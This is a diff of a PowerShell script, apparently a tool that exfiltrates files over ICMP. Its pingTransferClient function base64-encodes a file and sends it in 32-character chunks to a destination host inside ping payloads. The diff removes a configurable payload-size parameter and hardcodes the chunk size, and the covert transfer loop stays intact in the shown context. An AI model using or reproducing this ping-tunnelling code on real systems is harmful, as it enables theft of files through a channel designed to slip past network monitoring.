@@ -45,21 +45,11 @@ Function pingTransferClient{
     $Destination = $false,
     [parameter(Mandatory=$true,Position=1)]
     [string]
-    $File = $false,
-    [parameter(Mandatory=$false,Position=2)]
-    [string]
-    $PayloadSize = $false
+    $File = $false
   )
   
   Process{
     Try{
-
-      if($PayloadSize){
-        $sliceSize = $PayloadSize
-      }
-      else {
-        $sliceSize = 32
-      }
 
       #Starting stopwatch to measure execution time
       $StopWatch = [System.Diagnostics.Stopwatch]::StartNew()
@@ -69,8 +59,8 @@ Function pingTransferClient{
       $base64File = [System.Convert]::toBase64String($binaryFile).toCharArray()
 
       #Dividing filesize by chunksize to determine how many pings we will need
+      $sliceSize = 32
       $slicesNumber = [Math]::Ceiling($base64File.count / $sliceSize) 
-
 
       #Looping for each chunk to slice and send the data
       for($slice=0;$slice -lt $slicesNumber;$slice++){
@@ -85,7 +75,6 @@ Function pingTransferClient{
         $bytesSendBuffer = [System.Text.Encoding]::ASCII.GetBytes(($sendBuffer))
         $Ping = [System.Net.NetworkInformation.Ping]::new() 
         $Ping.Send($Destination,60,$bytesSendBuffer)
-
       }
       #Stopping stopwatch to print results
       $StopWatch.Stop()
@@ -108,5 +97,4 @@ Function pingTransferClient{
 
 #-----------------------------------------------------------[Execution]------------------------------------------------------------
 
-#Script Execution goes here
-pingTransferClient $args[0] $args[1] $args[2]
+pingTransferClient $args[0] $args[1]
